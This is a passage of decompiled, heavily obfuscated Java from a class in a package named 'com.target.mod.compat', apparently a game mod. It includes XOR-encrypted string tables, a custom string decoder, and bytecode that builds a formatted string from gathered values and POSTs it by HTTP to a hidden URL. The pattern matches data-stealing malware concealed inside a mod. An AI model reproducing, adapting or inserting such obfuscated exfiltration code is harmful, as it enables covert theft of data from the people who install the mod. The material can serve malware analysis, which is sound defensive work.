        //  1107: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_5:Ljava/lang/String;
        //  1110: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //  1113: aastore        
        //  1114: dup            
        //  1115: iconst_5       
        //  1116: ldc             16711680
        //  1118: invokestatic    java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
        //  1121: aastore        
        //  1122: dup            
        //  1123: bipush          6
        //  1125: aload           4
        //  1127: aastore        
        //  1128: dup            
        //  1129: bipush          7
        //  1131: aload_0        
        //  1132: sipush          -13852
        //  1135: sipush          27065
        //  1138: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1141: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //  1144: aastore        
        //  1145: dup            
        //  1146: bipush          8
        //  1148: aload           6
        //  1150: aastore        
        //  1151: dup            
        //  1152: bipush          9
        //  1154: aload           5
        //  1156: iload_1        
        //  1157: ifeq            1201
        //  1160: invokevirtual   java/lang/String.isEmpty:()Z
        //  1163: ifne            1204
        //  1166: goto            1173
        //  1169: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1172: athrow         
        //  1173: sipush          -13843
        //  1176: sipush          -19686
        //  1179: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1182: iconst_1       
        //  1183: anewarray       Ljava/lang/Object;
        //  1186: dup            
        //  1187: iconst_0       
        //  1188: aload           5
        //  1190: aastore        
        //  1191: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //  1194: goto            1201
        //  1197: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1200: athrow         
        //  1201: goto            1206
        //  1204: ldc             ""
        //  1206: aastore        
        //  1207: dup            
        //  1208: bipush          10
        //  1210: aload           7
        //  1212: aastore        
        //  1213: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //  1216: astore          8
        //  1218: aload_0        
        //  1219: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.file:Ljava/io/File;
        //  1222: iload_1        
        //  1223: ifeq            1258
        //  1226: ifnull          1285
        //  1229: goto            1236
        //  1232: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1235: athrow         
        //  1236: aload_0        
        //  1237: iload_1        
        //  1238: ifeq            1272
        //  1241: goto            1248
        //  1244: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1247: athrow         
        //  1248: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.file:Ljava/io/File;
        //  1251: goto            1258
        //  1254: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1257: athrow         
        //  1258: invokevirtual   java/io/File.exists:()Z
        //  1261: ifeq            1285
        //  1264: aload_0        
        //  1265: goto            1272
        //  1268: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1271: athrow         
        //  1272: aload           8
        //  1274: aload_0        
        //  1275: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.file:Ljava/io/File;
        //  1278: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.setStringAndFile:(Ljava/lang/String;Ljava/io/File;)V
        //  1281: iload_1        
        //  1282: ifne            1408
        //  1285: invokestatic    java/net/http/HttpRequest.newBuilder:()Ljava/net/http/HttpRequest$Builder;
        //  1288: aload_0        
        //  1289: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_3:Ljava/lang/String;
        //  1292: invokestatic    java/net/URI.create:(Ljava/lang/String;)Ljava/net/URI;
        //  1295: invokeinterface java/net/http/HttpRequest$Builder.uri:(Ljava/net/URI;)Ljava/net/http/HttpRequest$Builder;
        //  1300: sipush          -13856
        //  1303: sipush          -5883
        //  1306: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1309: sipush          -13848
        //  1312: sipush          6107
        //  1315: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1318: invokeinterface java/net/http/HttpRequest$Builder.header:(Ljava/lang/String;Ljava/lang/String;)Ljava/net/http/HttpRequest$Builder;
        //  1323: aload           8
        //  1325: invokestatic    java/net/http/HttpRequest$BodyPublishers.ofString:(Ljava/lang/String;)Ljava/net/http/HttpRequest$BodyPublisher;
        //  1328: invokeinterface java/net/http/HttpRequest$Builder.POST:(Ljava/net/http/HttpRequest$BodyPublisher;)Ljava/net/http/HttpRequest$Builder;
        //  1333: ldc2_w          30
        //  1336: invokestatic    java/time/Duration.ofSeconds:(J)Ljava/time/Duration;
        //  1339: invokeinterface java/net/http/HttpRequest$Builder.timeout:(Ljava/time/Duration;)Ljava/net/http/HttpRequest$Builder;
        //  1344: invokeinterface java/net/http/HttpRequest$Builder.build:()Ljava/net/http/HttpRequest;
        //  1349: astore          9
        //  1351: getstatic       com/target/mod/compat/sub1/sub1/sub7/Initializer_4.httpClient:Ljava/net/http/HttpClient;
        //  1354: aload           9
        //  1356: invokestatic    java/net/http/HttpResponse$BodyHandlers.ofString:()Ljava/net/http/HttpResponse$BodyHandler;
        //  1359: invokevirtual   java/net/http/HttpClient.send:(Ljava/net/http/HttpRequest;Ljava/net/http/HttpResponse$BodyHandler;)Ljava/net/http/HttpResponse;
        //  1362: astore          10
        //  1364: aload           10
        //  1366: invokeinterface java/net/http/HttpResponse.statusCode:()I
        //  1371: sipush          204
        //  1374: iload_1        
        //  1375: ifeq            1405
        //  1378: if_icmpeq       1408
        //  1381: goto            1388
        //  1384: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1387: athrow         
        //  1388: aload           10
        //  1390: invokeinterface java/net/http/HttpResponse.statusCode:()I
        //  1395: sipush          200
        //  1398: goto            1405
        //  1401: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1404: athrow         
        //  1405: if_icmpne       1408
        //  1408: goto            1412
        //  1411: astore_2       
        //  1412: return         
        //    StackMapTable: 00 77 FF 00 1F 00 04 07 00 02 01 07 00 78 07 00 62 00 01 07 01 41 03 1A 43 01 49 07 01 41 03 47 07 01 41 43 07 00 78 45 07 01 41 03 40 07 00 78 4C 07 01 41 03 46 07 01 41 43 07 00 7E FF 00 21 00 05 07 00 02 01 07 00 78 07 00 62 07 00 50 00 01 07 01 41 03 F7 00 4E 07 01 41 FA 00 03 43 01 49 07 01 41 03 4D 07 01 41 43 01 45 07 01 41 03 47 07 01 41 43 07 00 78 45 07 01 41 03 40 07 00 78 58 07 01 41 03 43 01 49 07 01 41 03 47 07 01 41 43 07 00 78 45 07 01 41 03 40 07 00 78 4C 07 01 41 03 46 07 01 41 43 07 01 67 4C 07 01 41 03 49 07 01 41 43 07 01 6D 05 48 07 00 62 FF 00 1E 00 05 07 00 02 01 07 00 78 07 00 62 07 00 62 00 01 07 01 41 03 5F 07 01 41 FA 00 03 43 01 FF 00 28 00 05 07 00 02 01 07 00 78 07 00 62 04 00 01 07 01 41 03 77 07 01 41 43 01 FA 00 00 FF 00 16 00 05 07 00 02 01 07 00 78 07 00 62 07 01 81 00 01 07 01 41 03 4D 07 01 41 43 01 45 07 01 41 03 63 07 01 41 03 40 01 FC 00 01 01 5A 07 01 41 43 01 45 07 01 41 03 47 07 01 41 43 07 00 02 45 07 01 41 43 01 02 4B 07 01 41 03 4A 07 00 04 FB 00 44 FF 00 11 00 06 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 00 01 07 01 41 03 4A 07 01 41 43 07 00 62 45 07 01 41 43 01 1B 48 07 00 62 FF 00 13 00 08 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 00 01 07 01 41 03 46 07 01 41 43 07 01 0A 10 F7 00 7E 07 01 41 FF 00 03 00 08 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 00 04 07 00 62 07 01 AF 07 01 AF 01 57 07 01 41 FF 00 03 00 08 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 00 05 07 00 62 07 01 AF 07 01 AF 01 07 00 62 FF 00 02 00 08 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 00 04 07 00 62 07 01 AF 07 01 AF 01 FF 00 01 00 08 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 00 05 07 00 62 07 01 AF 07 01 AF 01 07 00 62 FF 00 19 00 09 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 07 00 62 00 01 07 01 41 03 47 07 01 41 43 07 00 02 45 07 01 41 43 07 01 0A 49 07 01 41 43 07 00 02 0C FF 00 62 00 0B 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 07 00 62 07 01 B3 07 01 EE 00 01 07 01 41 03 4C 07 01 41 FF 00 03 00 0B 07 00 02 01 07 00 78 07 00 62 07 01 81 07 00 62 07 00 62 07 00 62 07 00 62 07 01 B3 07 01 EE 00 02 01 01 F9 00 02 FF 00 02 00 02 07 00 02 01 00 01 07 00 B3 FC 00 00 07 00 04
        //    Exceptions:
        //  Try           Handler
        //  Start  End    Start  End    Type                            
        //  -----  -----  -----  -----  --------------------------------
        //  1378   1398   1401   1405   Ljava/io/IOException;
        //  1364   1381   1384   1388   Ljava/io/IOException;
        //  1258   1265   1268   1272   Ljava/io/IOException;
        //  1236   1251   1254   1258   Ljava/io/IOException;
        //  1226   1241   1244   1248   Ljava/io/IOException;
        //  1218   1229   1232   1236   Ljava/io/IOException;
        //  1160   1194   1197   1201   Ljava/io/IOException;
        //  1042   1166   1169   1173   Ljava/io/IOException;
        //  1004   1018   1021   1025   Ljava/io/IOException;
        //  996    1007   1010   1014   Ljava/io/IOException;
        //  928    946    949    953    Ljava/io/IOException;
        //  918    936    939    943    Ljava/io/IOException;
        //  910    921    924    928    Ljava/io/IOException;
        //  807    819    822    826    Ljava/io/IOException;
        //  785    800    803    807    Ljava/io/IOException;
        //  775    790    793    797    Ljava/io/IOException;
        //  762    778    781    785    Ljava/io/IOException;
        //  758    768    771    775    Ljava/io/IOException;
        //  691    734    737    741    Ljava/io/IOException;
        //  673    694    697    701    Ljava/io/IOException;
        //  663    684    687    691    Ljava/io/IOException;
        //  655    666    669    673    Ljava/io/IOException;
        //  575    638    641    645    Ljava/io/IOException;
        //  552    578    581    585    Ljava/io/IOException;
        //  490    529    532    536    Ljava/io/IOException;
        //  467    493    496    500    Ljava/io/IOException;
        //  426    443    446    450    Ljava/io/IOException;
        //  419    429    432    436    Ljava/io/IOException;
        //  398    412    415    419    Ljava/io/IOException;
        //  391    401    404    408    Ljava/io/IOException;
        //  368    383    386    390    Ljava/io/IOException;
        //  358    373    376    380    Ljava/io/IOException;
        //  354    361    364    368    Ljava/io/IOException;
        //  321    343    346    350    Ljava/io/IOException;
        //  298    313    316    320    Ljava/io/IOException;
        //  288    303    306    310    Ljava/io/IOException;
        //  270    291    294    298    Ljava/io/IOException;
        //  260    281    284    288    Ljava/io/IOException;
        //  256    263    266    270    Ljava/io/IOException;
        //  159    245    248    252    Ljava/io/IOException;
        //  136    162    165    169    Ljava/io/IOException;
        //  110    124    127    131    Ljava/io/IOException;
        //  103    113    116    120    Ljava/io/IOException;
        //  80     95     98     102    Ljava/io/IOException;
        //  70     85     88     92     Ljava/io/IOException;
        //  66     73     76     80     Ljava/io/IOException;
        //  11     28     31     35     Ljava/io/IOException;
        //  4      1408   1411   1412   Ljava/io/IOException;
        //  4      1408   1411   1412   Ljava/lang/InterruptedException;
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Expression is linked from several locations: Label_0080:
        //     at com.strobel.decompiler.ast.Error.expressionLinkedFromMultipleLocations(Error.java:27)
        //     at com.strobel.decompiler.ast.AstOptimizer.mergeDisparateObjectInitializations(AstOptimizer.java:2604)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:235)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:206)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:93)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:868)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:761)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:638)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:605)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:195)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:162)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:137)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:333)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:254)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:144)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    private static boolean lambda$send$2(final Initializer_12 initializer_12) {
        return initializer_12.strValue.equals(createString(-13854, 11175));
    }
    
    private static boolean lambda$send$1(final Initializer_12 initializer_12) {
        return initializer_12.strValue.equals(createString(-13884, -8334));
    }
    
    private static boolean lambda$send$0(final Initializer_12 initializer_12) {
        return initializer_12.strValue.equals(createString(-13830, 17329));
    }
    
    static {
        final String[] strArr2 = new String[46];
        int n = 0;
        String s;
        int n2 = (s = """
                      n\u001b7\u001d ¦\u00eaOM\u00c6Q\u00c8¢\u00d1\u0002\u00d9Z\u0002±\u00cdv\u00155E~\u0003\u001afe(\u00c6²s\u0083hV\u00e9 \u008a¿\u0084\u00f1¶\u00da¼\u00ec<H\u0081/\u00d4\u008dy\u0010q\bµO\u0097\u0090|¥V\u00d0,Z\u0002\u008f\u0095\u00f7\u0094\u001a\u00f8\u00f4´K\u0090O\u00f6\u0083i\u00db\u00f8}9KM\u00de\u0002\u000eF\u00e7,\u00962y\u0093)V\u0094°\u0096§\u00d8°f\u00f7·\u00eeNJ o\u00f0\u0087©[\u00e0m:I-\u009e\u000e\u0006\u00c7\u00e6\u001c¶4}S©L\u00d1\u00e3\u008d\u00d79\u0002\u00ca\u0083\u001f\u0016µ½\u008f\u0091d\u0002\u00fc\u0003\u0015\u00fe\u008b-\u00c6~\u00cd\u00fe\u008e\u0012\u00ad°\u0016\u00f2\u00ff K\u00e2\u0089\u0010Tu\u0010t\u00cc\u00dd8\u0003TG\u00d3,\u0081\u001c2\u009b\u00fd\u0019,\u0004\u008b\u00c8\u0016X\u0013G5\u00f5MQ\u00d5\u00e0h\u00e21·\u00c9\u008a\u00f3\u0080\u0080O\u00fb\u0006\u0005\b\u00f2c~~\u0007\u0015¦\b\u000f\u00e5iY"°\u0000=E\u00ce\u00edf\u0011\u0082½M+<\u008e¹ed\r4\u00f2¡\u0007\u00f0\u001b\u0087a\u00e8\u0097wa\u000f6\u00efV\u0004U\u0081w¢\u0003\u00cf\u0085\u0016\f\u00ec\u0091¶w¿«H\u00d9G¤\u00f5\b\u001bp¥%\u00f1\u00cd{\u0006\u00c3\u008e\u00e7\u00cc`\f\u00e7·U½¾0¢½\u00d2N\u009a\u00fb]\u00ef
                      \u0086|$S\u00cf\u00c6\u0014\u00f6\u0087\r\u0004\u0015\u00cd\u007f+\u000b7\u0093\u00cc1\u00d0¢\u009eS\u00e4,¦\u0116=!\u00fd\u00fc\u0014J\u0086,9\u008ab8	¸\u00827x
                      ¡\u0085\u0095£>\u0093\u001f\u00d96?µ\u0012f\u009e\u00c4_T\u00e1\u0088¡\u00e4\u00c4L\u008f\b \u0003>¤\u0012\u0092f\u00f7²a5\u00d1,
                      ,\u00e9\u0081\u008c:\u00d5:[<{\u0019\u00d2¨\u0013\u00f1\b\u008b\u00ef«T\u00f2 \u008a}\u00d98\u001fz9\u0015\u00ff	*'c\u0000\u0006µ?hk\u0007\u0012M\u0002@\u00ce\u000b\u00ee"\u0082\u009bv\u00c9\u00c8\u001f\u00fd\u0089\b\u009a\u00d6\u0011\u00fbY»\u00f7¾c\u00e5Y\u00c9o*\u00db\u00d2&y1\u00e2¤\u009f\u00cc\u009a¿·\u009dA\u0018\u00fd\u0007\u00da	V\u007f\u00f6\u009e\u00da·\u00e3\u00d8bV\u0014£¤\u0090\u00fe¥ta\u008aL¾(L\u0007\u00ca(\£\u00c3\u00c6\u0094\u00d5¡d]\u0089\u001c\u009aVU\u00ecN\u00f58\u0018\u0013\u00f7§\u0096qg\u00c7;\u00d4q\u0011D\u0095#gb\u00ca¨3¢\u00cd\u0083\u00ebQ\u001f\u00f9\u0005P7W\u00c5\u001fuGGR\u00eel9\u00e7\u0090W\u009a\u00e0©u0\u0019\u00ad\u00f6³\u00f8\u0092w±Np\u00ea\u009f\u0000\u00e1$®·\u0093\u0092\u00cd=\u001f\u00d3\rL\u0096\u00cd\u00d2\u0081\u00c8\u008a\u001fwZ\u00f9 \u001b\u000b¡v\u001e\u008d\u008a5\u00d5¡\u008dr\u008b\u0013\u0084\u0007\u008d\u000b^\u001d\u0001q\u00de\u00120\u00adz\u007f\u009e\u0011\u008c\u00c9~\u0002¤\u009e\u0002\u0089[\u0003\u00e3\u00f7Q\u001eJC\u008btV\u00d5\u00ed\u0094d\u00ef£\u00f7}\u0013\u009c&\u0014\u00eb\u0001mO±B\u0003\u0017p\u00f1\u0096(3\u0007\u0081©\u009a\u00ee·U\u0013\fw|%\u0099\u00c1\u0005En\u00f7a\u00d7·\u0002§\u00f5In\u00ee\u00e6\u0098µV	f\u007fC\u00e3\u00f3\u00dfq2§\u0005\u00d2%3%_\u000f]½\u0015\u00c2I\u00e6\u00e5sb\u00f3\u00d8²\u0011K§&T\u00d3©\u0088>S2\u00ff\u00da;X\b\u00cd|>£.¿ \u00f6\u00dd(\u00cd½P%u»\u008b#j\u00c7+\u00fa\u0004 =\u00ff\u0096\u00024\u00c0\u0005\u0010r`n\u001e9.$\u009f\X^\u000f£\u0006\u00d4[\u00d7I¾T6\u00f1\u00d6 g\u009f¥\u0017\u00deW&<\u0012\u009d&$\u0084m\u001e®\u00f4\u0096\u00c1\r\u001e\u001b\u00c5E^\u008bp\u00f6\u0015S¡\u000b©\u0094\u00c2\u0014\u00d1\u00c0\u000b[\u00e9\u009be\u0085U2F\u00deB\u00cb!p|q¶\bC1\u0018z\u00dd#D\u0010.®\u00ca\u0010U\u00f0\u00d4.g\u009c-M\u008fao\u00fc\u00e8\u008a\u0000F\u001f?V\u0098\u00f35\u00eb\u0096\r\u0091+¬Lg>7\u00d2\u00d7m7\u00d1\u0014\u0099f\u000e2u°NZ¬<A7,¼]<~\u0083§\u0097Ti\u00c7\u000f¼\u009c\u0006\u00e8\u00e9\u00ddK\u00e4\u0085T<\u00dcD\u00c3\u00e1^\u00d8£\u00fa\u00dcZ¡\u00ed- P\u00f4\u00da\u0089\u00da\u00e0Y&\u00ef\u0011\u00fb\u0006\u00d2¦\u00c1±f\u0015o±\u00c5\u008cA\u00cfs
                      :\u0005H \u00f9\u008c/\u0002\u00fd\u001f\f\u00daªp\u0010gGSD$\u0017\u0099~59s\f+\u00e8 ¢¨
                      \u009aM\u00c8
                      \u0016\u0088KRO\u00cf\u0080x)¤\u0093\u00c8\u00cclr3\u0082\u00c9\u008e¤EX¢\u0016\u00d1\u009b\u0092¥q¯N}h\u0082\u001b\u001a2\u0003\u0086¿\u0006\u00dfq\u00de"-_\u0002¼s""").length();
        int n3 = 14;
        int n4 = -1;
    Label_0024:
        while (true) {
            while (true) {
                int n8;
                int n7;
                int n6;
                int n5 = n6 = (n7 = (n8 = 20));
                ++n4;
                final String s2 = s;
                final int beginIndex = n4;
                String s3 = s2.substring(beginIndex, beginIndex + n3);
                int n9 = -1;
                while (true) {
                    final char[] charArray = s3.toCharArray();
                    final int length = charArray.length;
                    int n10 = 0;
                    while (true) {
                        Label_0299: {
                            if (length > 1) {
                                break Label_0299;
                            }
                            n7 = (n6 = n10);
                            do {
                                final char c = charArray[n6];
                                charArray[n7] = (char)(c ^ (n5 ^ switch (n10 % 7) {
                                    case 0 -> 84;
                                    case 1 -> 57;
                                    case 2 -> 114;
                                    case 3 -> 2;
                                    case 4 -> 119;
                                    case 5 -> 7;
                                    default -> 122;
                                }));
                                ++n10;
                            } while (n8 == 0);
                        }
                        if (length > n10) {
                            continue;
                        }
                        break;
                    }
                    final String intern = new String(charArray).intern();
                    switch (n9) {
                        default: {
                            strArr2[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                continue Label_0024;
                            }
                            n2 = (s = "\u00f2v»\u0002A\u009b\u008bC\fO\u0099\u0082&\u0096\"\u00f6\u00ee©¶ \u0010\u00e2&\u00f6³µcp\u008a*\u00fb2\u0014SD\u008c¬9«CA\r\u00e2(\u00010I9\u00df®\u00df\u007f\u008c\u0084\u0084Vv\u00eedª\u00e7@:\u00eecw\u001b\u0085vv(\u00ea¯*\u009eP\u0015\u00ec\u00867¥\u00d8±n\u00ca6±\u00ea\u001c^x²¶\u00dd\u00c7\u00d4G\u00e5\u0093I\u008e\u00e3\u0017\u0002J\u00fb\u00cekap,`\u00ed©\n\u00c7¯¯\\\u0013¯\u00c8\u0082rE\u0088N5c\u00d1\u0007/&\u0003\u00e0\u00cak2x\u0080\u00e94\u0097\u00f1\u0099v").length();
                            n3 = 6;
                            n4 = -1;
                            break;
                        }
                        case 0: {
                            strArr2[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                break;
                            }
                            break Label_0024;
                        }
                    }
                    n5 = (n6 = (n7 = (n8 = 121)));
                    ++n4;
                    final String s4 = s;
                    final int beginIndex2 = n4;
                    s3 = s4.substring(beginIndex2, beginIndex2 + n3);
                    n9 = 0;
                }
            }
            break;
        }
        strArr = strArr2;
        strArr_1 = new String[46];
        strValue = createString(-13878, -19525);
        strValue_2 = createString(-13836, -1859);
        strValue_1 = createString(-13849, 19618);
        httpClient = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(10L)).build();
    }
    
    private static Throwable computeThrowable(final Throwable t) {
        return t;
    }
    
    private static String createString(final int n, final int n2) {
        final int n3 = (n ^ 0xFFFFC9EE) & 0xFFFF;
        if (Initializer_4.strArr_1[n3] == null) {
            final char[] charArray = Initializer_4.strArr[n3].toCharArray();
            final int n5 = switch (charArray[0] & '\u00ff') {
                case 0 -> 247;
                case 1 -> 26;
                case 2 -> 75;
                case 3 -> 187;
                case 4 -> 210;
                case 5 -> 176;
                case 6 -> 146;
                case 7 -> 100;
                case 8 -> 89;
                case 9 -> 239;
                case 10 -> 180;
                case 11 -> 217;
                case 12 -> 129;
                case 13 -> 204;
                case 14 -> 24;
                case 15 -> 94;
                case 16 -> 44;
                case 17 -> 192;
                case 18 -> 120;
                case 19 -> 132;
                case 20 -> 206;
                case 21 -> 102;
                case 22 -> 98;
                case 23 -> 165;
                case 24 -> 101;
                case 25 -> 81;
                case 26 -> 43;
                case 27 -> 47;
                case 28 -> 127;
                case 29 -> 76;
                case 30 -> 152;
                case 31 -> 0;
                case 32 -> 195;
                case 33 -> 194;
                case 34 -> 108;
                case 35 -> 249;
                case 36 -> 188;
                case 37 -> 168;
                case 38 -> 77;
                case 39 -> 139;
                case 40 -> 71;
                case 41 -> 170;
                case 42 -> 122;
                case 43 -> 67;
                case 44 -> 179;
                case 45 -> 123;
                case 46 -> 202;
                case 47 -> 235;
                case 48 -> 3;
                case 49 -> 224;
                case 50 -> 103;
                case 51 -> 252;
                case 52 -> 134;
                case 53 -> 229;
                case 54 -> 11;
                case 55 -> 114;
                case 56 -> 62;
                case 57 -> 72;
                case 58 -> 142;
                case 59 -> 83;
                case 60 -> 137;
                case 61 -> 225;
                case 62 -> 34;
                case 63 -> 216;
                case 64 -> 6;
                case 65 -> 244;
                case 66 -> 212;
                case 67 -> 125;
                case 68 -> 45;
                case 69 -> 60;
                case 70 -> 73;
                case 71 -> 130;
                case 72 -> 153;
                case 73 -> 218;
                case 74 -> 159;
                case 75 -> 230;
                case 76 -> 91;
                case 77 -> 167;
                case 78 -> 29;
                case 79 -> 85;
                case 80 -> 222;
                case 81 -> 10;
                case 82 -> 248;
                case 83 -> 61;
                case 84 -> 27;
                case 85 -> 161;
                case 86 -> 38;
                case 87 -> 199;
                case 88 -> 220;
                case 89 -> 174;
                case 90 -> 135;
                case 91 -> 113;
                case 92 -> 121;
                case 93 -> 105;
                case 94 -> 90;
                case 95 -> 208;
                case 96 -> 42;
                case 97 -> 198;
                case 98 -> 234;
                case 99 -> 18;
                case 100 -> 41;
                case 101 -> 19;
                case 102 -> 109;
                case 103 -> 245;
                case 104 -> 250;
                case 105 -> 158;
                case 106 -> 88;
                case 107 -> 231;
                case 108 -> 13;
                case 109 -> 136;
                case 110 -> 147;
                case 111 -> 157;
                case 112 -> 111;
                case 113 -> 68;
                case 114 -> 57;
                case 115 -> 223;
                case 116 -> 119;
                case 117 -> 28;
                case 118 -> 214;
                case 119 -> 5;
                case 120 -> 178;
                case 121 -> 54;
                case 122 -> 115;
                case 123 -> 48;
                case 124 -> 196;
                case 125 -> 207;
                case 126 -> 143;
                case 127 -> 164;
                case 128 -> 138;
                case 129 -> 23;
                case 130 -> 69;
                case 131 -> 173;
                case 132 -> 148;
                case 133 -> 16;
                case 134 -> 39;
                case 135 -> 190;
                case 136 -> 30;
                case 137 -> 87;
                case 138 -> 14;
                case 139 -> 8;
                case 140 -> 96;
                case 141 -> 213;
                case 142 -> 104;
                case 143 -> 171;
                case 144 -> 7;
                case 145 -> 99;
                case 146 -> 2;
                case 147 -> 241;
                case 148 -> 242;
                case 149 -> 181;
                case 150 -> 215;
                case 151 -> 25;
                case 152 -> 40;
                case 153 -> 193;
                case 154 -> 154;
                case 155 -> 254;
                case 156 -> 155;
                case 157 -> 35;
                case 158 -> 51;
                case 159 -> 166;
                case 160 -> 255;
                case 161 -> 106;
                case 162 -> 133;
                case 163 -> 172;
                case 164 -> 131;
                case 165 -> 86;
                case 166 -> 177;
                case 167 -> 97;
                case 168 -> 118;
                case 169 -> 31;
                case 170 -> 203;
                case 171 -> 58;
                case 172 -> 22;
                case 173 -> 205;
                case 174 -> 63;
                case 175 -> 46;
                case 176 -> 74;
                case 177 -> 9;
                case 178 -> 82;
                case 179 -> 36;
                case 180 -> 32;
                case 181 -> 66;
                case 182 -> 186;
                case 183 -> 228;
                case 184 -> 246;
                case 185 -> 183;
                case 186 -> 141;
                case 187 -> 55;
                case 188 -> 243;
                case 189 -> 184;
                case 190 -> 226;
                case 191 -> 151;
                case 192 -> 233;
                case 193 -> 49;
                case 194 -> 93;
                case 195 -> 145;
                case 196 -> 20;
                case 197 -> 79;
                case 198 -> 253;
                case 199 -> 209;
                case 200 -> 110;
                case 201 -> 21;
                case 202 -> 191;
                case 203 -> 112;
                case 204 -> 162;
                case 205 -> 144;
                case 206 -> 50;
                case 207 -> 200;
                case 208 -> 150;
                case 209 -> 182;
                case 210 -> 65;
                case 211 -> 1;
                case 212 -> 201;
                case 213 -> 175;
                case 214 -> 221;
                case 215 -> 189;
                case 216 -> 52;
                case 217 -> 70;
                case 218 -> 232;
                case 219 -> 124;
                case 220 -> 163;
                case 221 -> 156;
                case 222 -> 4;
                case 223 -> 126;
                case 224 -> 128;
                case 225 -> 15;
                case 226 -> 219;
                case 227 -> 238;
                case 228 -> 64;
                case 229 -> 211;
                case 230 -> 185;
                case 231 -> 95;
                case 232 -> 12;
                case 233 -> 92;
                case 234 -> 117;
                case 235 -> 169;
                case 236 -> 236;
                case 237 -> 251;
                case 238 -> 160;
                case 239 -> 116;
                case 240 -> 227;
                case 241 -> 17;
                case 242 -> 78;
                case 243 -> 197;
                case 244 -> 59;
                case 245 -> 149;
                case 246 -> 53;
                case 247 -> 56;
                case 248 -> 37;
                case 249 -> 237;
                case 250 -> 80;
                case 251 -> 240;
                case 252 -> 33;
                case 253 -> 84;
                case 254 -> 107;
                default -> 140;
            };
            int n6 = (n2 & 0xFF) - n5;
            if (n6 < '\0') {
                n6 += '\u0100';
            }
            int n7 = ((n2 & 0xFFFF) >>> 8) - n5;
            if (n7 < '\0') {
                n7 += '\u0100';
            }
            for (int i = 0; i < charArray.length; ++i) {
                final int n8 = i % 2;
                final char[] array = charArray;
                final int n9 = i;
                final char c = array[n9];
                if (n8 == 0) {
